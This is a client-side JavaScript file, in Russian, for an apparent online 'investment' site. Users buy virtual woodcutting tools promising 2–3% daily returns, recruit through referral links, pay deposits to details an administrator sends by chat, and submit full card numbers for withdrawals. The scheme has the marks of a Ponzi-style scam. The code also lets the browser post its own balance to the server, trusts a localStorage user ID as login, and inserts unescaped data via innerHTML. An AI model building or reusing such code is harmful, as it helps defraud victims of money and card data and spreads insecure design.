// ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
let userId = null;
let userData = {
    balance: 0,
    totalFund: 0,
    referrals: 0,
    referralEarn: 0,
    lastProfit: new Date().toISOString()
};
let items = [];
let investments = [];
let history = [];

// Товары
const shopItems = [
    { id: 1, name: 'Тупой топор', icon: '🪓', price: 100, profit: '2-3%' },
    { id: 2, name: 'Острый топор', icon: '🪵', price: 500, profit: '2-3%' },
    { id: 3, name: 'Ножовка', icon: '🪚', price: 2000, profit: '2-3%' },
    { id: 4, name: 'Бензопила', icon: '⛓️', price: 10000, profit: '2-3%' },
    { id: 5, name: 'Проф. техника', icon: '🚜', price: 50000, profit: '2-3%' }
];

// Глобальные переменные для модалок
let selectedItem = null;
let currentRequestId = null;
let checkInterval = null;
let currentMethod = 'visa';
let currentEmail = '';

// ========== ИНИЦИАЛИЗАЦИЯ ==========
window.onload = async function() {
    console.log('Страница загружена');
    
    // Проверяем авторизацию
    const savedUserId = localStorage.getItem('userId');
    if (savedUserId) {
        userId = savedUserId;
        await loadUserData();
        hideAuthModal();
    } else {
        showAuthModal();
    }
    
    // Загружаем статистику
    loadStats();
    
    // Проверяем реферала
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref');
    if (ref) {
        sessionStorage.setItem('referrer', ref);
    }
    
    // Обновляем UI
    updateUI();
    renderShop();
    renderInvestments();
    renderHistory();
    
    // Запускаем периодическое обновление
    setInterval(loadStats, 30000);
    setInterval(checkRequests, 5000);
};

// ========== АВТОРИЗАЦИЯ ==========
function showAuthModal() {
    document.getElementById('authModal').style.display = 'flex';
}

function hideAuthModal() {
    document.getElementById('authModal').style.display = 'none';
}

function switchAuthTab(tab) {
    document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.auth-content').forEach(c => c.style.display = 'none');
    
    if (tab === 'login') {
        document.querySelectorAll('.auth-tab')[0].classList.add('active');
        document.getElementById('loginForm').style.display = 'flex';
    } else {
        document.querySelectorAll('.auth-tab')[1].classList.add('active');
        document.getElementById('registerForm').style.display = 'flex';
    }
}

// ========== ДВУХЭТАПНАЯ РЕГИСТРАЦИЯ ==========
async function sendVerificationCode() {
    const email = document.getElementById('regEmail').value;
    
    if (!email) {
        showError('Введите email');
        return;
    }
    
    // Показываем модалку с кодом
    document.getElementById('verificationEmail').textContent = email;
    currentEmail = email;
    showModal('verification');
    
    const response = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
    });
    
    const data = await response.json();
    if (!data.success) {
        showError(data.error);
        hideModal('verification');
    } else {
        showSuccess('Код отправлен на почту!');
    }
}

async function verifyCode() {
    const code = document.getElementById('verificationCode').value;
    const password = document.getElementById('regPassword').value;
    const confirm = document.getElementById('regConfirm').value;
    
    if (!code || code.length !== 6) {
        showError('Введите 6-значный код');
        return;
    }
    
    if (password !== confirm) {
        showError('Пароли не совпадают');
        return;
    }
    
    if (password.length < 6) {
        showError('Пароль должен быть минимум 6 символов');
        return;
    }
    
    const response = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            code, 
            password,
            email: currentEmail 
        })
    });
    
    const data = await response.json();
    if (data.success) {
        hideModal('verification');
        showSuccess('Регистрация успешна! Теперь войдите в аккаунт.');
        switchAuthTab('login');
        
        // Очищаем поля
        document.getElementById('regEmail').value = '';
        document.getElementById('regPassword').value = '';
        document.getElementById('regConfirm').value = '';
        document.getElementById('verificationCode').value = '';
    } else {
        showError(data.error);
    }
}

async function login() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    
    if (!email || !password) {
        showError('Введите email и пароль');
        return;
    }
    
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
    });
    
    const data = await response.json();
    if (data.success) {
        userId = data.user.id;
        localStorage.setItem('userId', userId);
        await loadUserData();
        hideAuthModal();
        updateUI();
        renderShop();
        renderInvestments();
        renderHistory();
        showSuccess('Вход выполнен успешно!');
    } else {
        showError(data.error);
    }
}

function logout() {
    localStorage.removeItem('userId');
    userId = null;
    showAuthModal();
}

// ========== ЗАГРУЗКА ДАННЫХ ==========
async function loadUserData() {
    if (!userId) return;
    
    const response = await fetch(`/api/user/${userId}`);
    const data = await response.json();
    
    if (data.success) {
        userData = data.user;
        items = data.items || [];
        investments = data.investments || [];
        history = data.history || [];
        updateUI();
        renderInvestments();
        renderHistory();
    }
}

async function loadStats() {
    const response = await fetch('/api/stats');
    const data = await response.json();
    
    const totalUsersEl = document.getElementById('totalUsers');
    const totalInvestmentsEl = document.getElementById('totalInvestments');
    const statsTimeEl = document.getElementById('statsTime');
    
    if (totalUsersEl) totalUsersEl.textContent = data.totalUsers;
    if (totalInvestmentsEl) totalInvestmentsEl.textContent = formatNumber(data.totalInvestments);
    if (statsTimeEl) statsTimeEl.textContent = new Date(data.updatedAt).toLocaleString();
}

// ========== UI ОБНОВЛЕНИЕ ==========
function updateUI() {
    const balanceEl = document.getElementById('balance');
    const userIdEl = document.getElementById('userId');
    const referralsEl = document.getElementById('referrals');
    const referralEarnEl = document.getElementById('referralEarn');
    const totalFundEl = document.getElementById('totalFund');
    const refLinkEl = document.getElementById('refLink');
    const progressFill = document.getElementById('progressFill');
    
    if (balanceEl) balanceEl.innerText = formatNumber(userData.balance);
    if (userIdEl) userIdEl.innerText = userId || 'Не авторизован';
    if (referralsEl) referralsEl.innerText = userData.referrals;
    if (referralEarnEl) referralEarnEl.innerText = formatNumber(userData.referralEarn);
    if (totalFundEl) totalFundEl.innerText = formatNumber(userData.totalFund);
    if (refLinkEl) refLinkEl.value = `${window.location.origin}/?ref=${userData.refCode || ''}`;
    
    const percent = Math.min(100, Math.floor((userData.totalFund / 2500000) * 100));
    if (progressFill) progressFill.style.width = percent + '%';
    
    updateProfitToday();
}

function formatNumber(num) {
    return num ? num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") : '0';
}

// ========== РЕФЕРАЛЫ ==========
function copyRef() {
    const input = document.getElementById('refLink');
    if (!input) return;
    
    input.select();
    navigator.clipboard.writeText(input.value);
    
    const btn = event.currentTarget;
    const originalHtml = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-check"></i>';
    setTimeout(() => {
        btn.innerHTML = originalHtml;
    }, 1500);
}

// ========== МАГАЗИН ==========
function renderShop() {
    const container = document.getElementById('shop');
    if (!container) return;
    
    container.innerHTML = '';
    
    shopItems.forEach(item => {
        const count = items.filter(i => i && i.itemId === item.id).length;
        
        const card = document.createElement('div');
        card.className = 'shop-item';
        card.setAttribute('onclick', `openBuy(${item.id})`);
        
        card.innerHTML = `
            <div class="item-icon">${item.icon}</div>
            <div class="item-name">${item.name}</div>
            <div class="item-price">${formatNumber(item.price)} ₽</div>
            <div class="item-stats">
                <span><i class="fas fa-chart-line"></i> ${item.profit}</span>
                <span><i class="fas fa-box"></i> ${count}</span>
            </div>
        `;
        
        container.appendChild(card);
    });
}

function openBuy(id) {
    if (!userId) {
        showError('Сначала войдите в систему');
        return;
    }
    
    selectedItem = shopItems.find(i => i.id === id);
    if (!selectedItem) return;
    
    const buyContent = document.getElementById('buyContent');
    if (!buyContent) return;
    
    buyContent.innerHTML = `
        <div style="text-align: center; font-size: 80px; margin: 20px;">${selectedItem.icon}</div>
        <h3 style="text-align: center; color: white; font-size: 24px; margin-bottom: 20px;">${selectedItem.name}</h3>
        <div style="background: rgba(0,0,0,0.2); border-radius: 20px; padding: 20px;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
                <span style="color: rgba(255,255,255,0.7);">Цена:</span>
                <span style="color: gold; font-size: 20px;">${formatNumber(selectedItem.price)} ₽</span>
            </div>
            <div style="display: flex; justify-content: space-between;">
                <span style="color: rgba(255,255,255,0.7);">Доход в день:</span>
                <span style="color: #4caf50; font-size: 20px;">2-3%</span>
            </div>
        </div>
    `;
    
    showModal('buy');
}

async function confirmBuy() {
    if (!selectedItem || !userId) return;
    
    if (userData.balance >= selectedItem.price) {
        const profitPercent = (Math.random() * 1 + 2).toFixed(1);
        
        const response = await fetch('/api/buy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userId: userId,
                itemId: selectedItem.id,
                itemName: selectedItem.name,
                itemIcon: selectedItem.icon,
                price: selectedItem.price,
                profit: parseFloat(profitPercent)
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            userData.balance -= selectedItem.price;
            userData.totalFund += selectedItem.price;
            
            items.push({ itemId: selectedItem.id });
            investments.push({
                itemName: selectedItem.name,
                itemIcon: selectedItem.icon,
                amount: selectedItem.price,
                profit: parseFloat(profitPercent),
                date: new Date().toISOString()
            });
            
            await fetch('/api/user/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: userId,
                    balance: userData.balance,
                    totalFund: userData.totalFund,
                    referrals: userData.referrals,
                    referralEarn: userData.referralEarn,
                    lastProfit: userData.lastProfit
                })
            });
            
            updateUI();
            renderShop();
            renderInvestments();
            hideModal('buy');
            
            showSuccess('Покупка совершена!', `Доходность: ${profitPercent}% в день`);
        }
    } else {
        showError('Недостаточно средств');
    }
}

// ========== ИНВЕСТИЦИИ ==========
function renderInvestments() {
    const container = document.getElementById('investments');
    if (!container) return;
    
    if (!investments || investments.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 50px; color: rgba(255,255,255,0.5);">Нет активных инвестиций</div>';
        return;
    }
    
    container.innerHTML = '';
    investments.forEach(inv => {
        if (!inv) return;
        const daily = Math.round(inv.amount * (inv.profit || 0) / 100);
        
        const el = document.createElement('div');
        el.className = 'invest-item';
        el.innerHTML = `
            <div class="invest-left">
                <div class="invest-icon">${inv.itemIcon || '🪓'}</div>
                <div class="invest-info">
                    <h4>${inv.itemName || 'Инвестиция'}</h4>
                    <div class="invest-date">${inv.date ? new Date(inv.date).toLocaleDateString() : ''}</div>
                </div>
            </div>
            <div class="invest-right">
                <div class="invest-amount">${formatNumber(inv.amount)} ₽</div>
                <div class="invest-daily">+${formatNumber(daily)} ₽/день</div>
            </div>
        `;
        
        container.appendChild(el);
    });
}

function updateProfitToday() {
    let total = 0;
    if (investments && investments.length > 0) {
        investments.forEach(inv => {
            if (inv && inv.amount && inv.profit) {
                total += inv.amount * inv.profit / 100;
            }
        });
    }
    
    const profitElement = document.getElementById('profitToday');
    if (profitElement) {
        profitElement.innerText = formatNumber(Math.round(total));
    }
}

async function collectProfit() {
    if (!userId) {
        showError('Сначала войдите в систему');
        return;
    }
    
    const last = new Date(userData.lastProfit);
    const now = new Date();
    const hours = (now - last) / (1000 * 60 * 60);
    
    if (hours >= 24 || !investments || investments.length === 0) {
        let total = 0;
        if (investments && investments.length > 0) {
            investments.forEach(inv => {
                if (inv && inv.amount && inv.profit) {
                    total += inv.amount * inv.profit / 100;
                }
            });
        }
        total = Math.round(total);
        
        if (total > 0) {
            userData.balance += total;
            userData.lastProfit = now.toISOString();
            
            await fetch('/api/user/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: userId,
                    balance: userData.balance,
                    totalFund: userData.totalFund,
                    referrals: userData.referrals,
                    referralEarn: userData.referralEarn,
                    lastProfit: userData.lastProfit
                })
            });
            
            await loadUserData();
            updateUI();
            renderHistory();
            
            showSuccess('Прибыль собрана!', `+${formatNumber(total)} ₽`);
        } else {
            showInfo('Нет прибыли для сбора');
        }
    } else {
        const left = Math.ceil(24 - hours);
        showInfo(`До следующего сбора: ${left} ч.`);
    }
}

// ========== ИСТОРИЯ ==========
function renderHistory() {
    const container = document.getElementById('history');
    if (!container) return;
    
    if (!history || history.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 30px; color: rgba(255,255,255,0.5);">История пуста</div>';
        return;
    }
    
    container.innerHTML = '';
    history.slice(0, 15).forEach(h => {
        if (!h) return;
        const icons = {
            'deposit': '💰',
            'withdraw': '💸',
            'purchase': '🪓',
            'profit': '📈'
        };
        
        const el = document.createElement('div');
        el.className = 'history-item';
        el.innerHTML = `
            <div class="history-left">
                <div class="history-icon ${h.type || ''}">${icons[h.type] || '📝'}</div>
                <div>
                    <div class="history-desc">${h.desc || ''}</div>
                    <div class="history-date">${h.date ? new Date(h.date).toLocaleString() : ''}</div>
                </div>
            </div>
            <div class="history-amount ${h.type === 'withdraw' ? 'minus' : 'plus'}">
                ${h.type === 'withdraw' ? '-' : '+'}${formatNumber(h.amount || 0)} ₽
            </div>
        `;
        
        container.appendChild(el);
    });
}

// ========== ПОПОЛНЕНИЕ ==========
function selectMethod(el, method) {
    document.querySelectorAll('.pay-method').forEach(m => m.classList.remove('active'));
    el.classList.add('active');
    currentMethod = method;
}

function updateWithdrawNet() {
    const amountInput = document.getElementById('withdrawSum');
    const withdrawNet = document.getElementById('withdrawNet');
    
    if (!amountInput || !withdrawNet) return;
    
    const amount = parseInt(amountInput.value) || 0;
    const net = Math.round(amount * 0.97);
    withdrawNet.innerHTML = formatNumber(net) + ' ₽';
}

function formatCard(input) {
    if (!input) return;
    
    let v = input.value.replace(/\D/g, '').substring(0, 16);
    let parts = [];
    for (let i = 0; i < v.length; i += 4) {
        parts.push(v.substring(i, i + 4));
    }
    input.value = parts.join(' ');
    updateWithdrawNet();
}

async function createDeposit() {
    if (!userId) {
        showError('Сначала войдите в систему');
        return;
    }
    
    const amountInput = document.getElementById('depositSum');
    if (!amountInput) return;
    
    const amount = parseInt(amountInput.value);
    
    if (amount < 100) {
        showError('Минимальная сумма 100 ₽');
        return;
    }
    
    const response = await fetch('/api/deposit/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userId: userId,
            amount: amount,
            method: currentMethod
        })
    });
    
    const data = await response.json();
    
    if (data.success) {
        hideModal('deposit');
        showSuccess('Заявка создана! Ожидайте реквизиты в чате.');
        currentRequestId = data.requestId;
        openChat();
    }
}

async function createWithdraw() {
    if (!userId) {
        showError('Сначала войдите в систему');
        return;
    }
    
    const amountInput = document.getElementById('withdrawSum');
    const cardInput = document.getElementById('cardNumber');
    
    if (!amountInput || !cardInput) return;
    
    const amount = parseInt(amountInput.value);
    const card = cardInput.value.replace(/\s/g, '');
    
    if (amount < 100 || amount > 50000) {
        showError('Сумма от 100 до 50000 ₽');
        return;
    }
    
    if (card.length < 16) {
        showError('Введите номер карты');
        return;
    }
    
    if (amount > userData.balance) {
        showError('Недостаточно средств');
        return;
    }
    
    const response = await fetch('/api/withdraw/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userId: userId,
            amount: amount,
            card: card.slice(-4).padStart(16, '*'),
            fullCard: card
        })
    });
    
    const data = await response.json();
    
    if (data.success) {
        userData.balance -= amount;
        
        await fetch('/api/user/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userId: userId,
                balance: userData.balance,
                totalFund: userData.totalFund,
                referrals: userData.referrals,
                referralEarn: userData.referralEarn,
                lastProfit: userData.lastProfit
            })
        });
        
        updateUI();
        hideModal('withdraw');
        showSuccess('Заявка создана! Ожидайте обработки.');
    }
}

// ========== ЧАТ ==========
function openChat() {
    const chatMessages = document.getElementById('chatMessages');
    if (chatMessages) {
        chatMessages.innerHTML = `
            <div class="chat-msg">⏳ Заявка #${currentRequestId} создана</div>
            <div class="chat-msg">Ожидайте реквизиты от администратора...</div>
        `;
    }
    
    document.getElementById('paymentInfo').style.display = 'none';
    document.getElementById('payBtn').style.display = 'none';
    showModal('chat');
    
    if (checkInterval) clearInterval(checkInterval);
    
    checkInterval = setInterval(async () => {
        await checkRequests();
    }, 3000);
}

async function checkRequests() {
    if (!currentRequestId) return;
    
    const response = await fetch(`/api/deposit/user/${userId}`);
    const data = await response.json();
    
    if (data.requests && data.requests.length > 0) {
        const request = data.requests.find(r => r.id === currentRequestId);
        
        if (request && request.paymentDetails) {
            const chatMessages = document.getElementById('chatMessages');
            const paymentInfo = document.getElementById('paymentInfo');
            const payBtn = document.getElementById('payBtn');
            
            if (chatMessages) {
                chatMessages.innerHTML += `
                    <div class="chat-msg">💬 Администратор:</div>
                    <div class="chat-msg" style="background: rgba(76,175,80,0.1); border-left-color: gold;">
                        ${request.paymentDetails.replace(/\n/g, '<br>')}
                    </div>
                `;
            }
            
            if (paymentInfo) {
                paymentInfo.innerHTML = request.paymentDetails.replace(/\n/g, '<br>');
                paymentInfo.style.display = 'block';
            }
            
            if (payBtn) payBtn.style.display = 'block';
            
            if (checkInterval) clearInterval(checkInterval);
            checkInterval = null;
        }
    }
}

async function confirmPayment() {
    if (!currentRequestId) return;
    
    await fetch('/api/deposit/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            requestId: currentRequestId,
            status: 'paid'
        })
    });
    
    const chatMessages = document.getElementById('chatMessages');
    if (chatMessages) {
        chatMessages.innerHTML += `
            <div class="chat-msg" style="background: rgba(76,175,80,0.2); color: #8bc34a;">
                ✅ Вы подтвердили оплату. Средства поступят после проверки.
            </div>
        `;
    }
    
    document.getElementById('payBtn').style.display = 'none';
}

// ========== УПРАВЛЕНИЕ МОДАЛКАМИ ==========
function showModal(type) {
    const modal = document.getElementById(`modal${type.charAt(0).toUpperCase() + type.slice(1)}`);
    if (modal) modal.style.display = 'flex';
}

function hideModal(type) {
    if (type === 'chat' && checkInterval) {
        clearInterval(checkInterval);
        checkInterval = null;
    }
    
    const modal = document.getElementById(`modal${type.charAt(0).toUpperCase() + type.slice(1)}`);
    if (modal) modal.style.display = 'none';
}

// Закрытие по клику вне
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('modal-overlay')) {
        if (e.target.id === 'modalChat' && checkInterval) {
            clearInterval(checkInterval);
            checkInterval = null;
        }
        e.target.style.display = 'none';
    }
});

// ========== УВЕДОМЛЕНИЯ ==========
function showSuccess(title, message = '') {
    const notification = document.createElement('div');
    notification.className = 'notification success';
    notification.innerHTML = `<strong>✅ ${title}</strong> ${message}`;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function showError(message) {
    const notification = document.createElement('div');
    notification.className = 'notification error';
    notification.innerHTML = `<strong>❌ Ошибка:</strong> ${message}`;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function showInfo(message) {
    const notification = document.createElement('div');
    notification.className = 'notification info';
    notification.innerHTML = `<strong>ℹ️ ${message}</strong>`;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

// ========== ЭКСПОРТ ФУНКЦИЙ ==========
window.showModal = showModal;
window.hideModal = hideModal;
window.selectMethod = selectMethod;
window.formatCard = formatCard;
window.updateWithdrawNet = updateWithdrawNet;
window.createDeposit = createDeposit;
window.createWithdraw = createWithdraw;
window.confirmPayment = confirmPayment;
window.openBuy = openBuy;
window.confirmBuy = confirmBuy;
window.collectProfit = collectProfit;
window.copyRef = copyRef;
window.switchAuthTab = switchAuthTab;
window.sendVerificationCode = sendVerificationCode;
window.verifyCode = verifyCode;
window.login = login;
window.logout = logout;